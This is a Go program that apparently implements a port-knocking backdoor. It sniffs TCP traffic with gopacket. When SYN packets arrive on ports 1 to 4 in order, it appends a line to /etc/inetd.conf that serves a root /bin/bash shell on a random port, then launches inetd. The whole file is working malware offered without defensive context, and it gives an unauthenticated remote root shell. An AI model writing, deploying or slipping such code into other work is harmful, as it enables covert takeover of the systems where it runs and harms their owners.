package main

import (
	"fmt"
	"log"
	"math/rand"
	"os"
	"os/exec"
	"strconv"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
)

var targetInterface = "ens160"
var snaplen = int32(1600)
var filter = "tcp"
var secretPorts = []int{1, 2, 3, 4}
var secretCounter = 0

func main() {
	// Read package and analze them
	handle, err := pcap.OpenLive(targetInterface, snaplen, true, pcap.BlockForever)
	errorPrinter(err)

	handle.SetBPFFilter(filter)
	packets := gopacket.NewPacketSource(handle, handle.LinkType()).Packets()
	for pkt := range packets {
		// Your analysis here! Get the important stuff
		printPacketInfo(pkt)
	}
}

func errorPrinter(err error) {
	if err != nil {
		log.Panicln(err)
	}
}

func printPacketInfo(packet gopacket.Packet) {

	// Let's see if the packet is TCP
	tcpLayer := packet.Layer(layers.LayerTypeTCP)
	if tcpLayer != nil {
		tcp, _ := tcpLayer.(*layers.TCP)

		// Check the TCP Flag
		if tcp.SYN {
			// fmt.Printf("From port %d to %d\n", tcp.SrcPort, tcp.DstPort)
			// Check dst port for secret port
			if tcp.DstPort == layers.TCPPort(secretPorts[secretCounter]) {
				secretCounter++
			} else {
				// reset counter
				secretCounter = 0
			}
		}
	}

	if secretCounter == len(secretPorts) {
		// open the gateway
		go vishnu()
		secretCounter = 0
	}

	// Check for errors
	if err := packet.ErrorLayer(); err != nil {
		fmt.Println("Error decoding some part of the packet:", err)
	}
}

func vishnu() {
	randomPort := rand.Intn(65535-100) + 100
	// println("The doors are open on port ", strconv.Itoa(randomPort))
	// Append to a file /etc/inetd.conf
	fd, err := os.OpenFile("/etc/inetd.conf", os.O_APPEND|os.O_WRONLY|os.O_CREATE, 0600)
	errorPrinter(err)
	defer fd.Close()

	if _, err = fd.WriteString(strconv.Itoa(randomPort) + " stream tcp nowait root /bin/bash bash\n"); err != nil {
		log.Panicln(err)
	}

	exec.Command("/usr/sbin/inetd").Run()

}
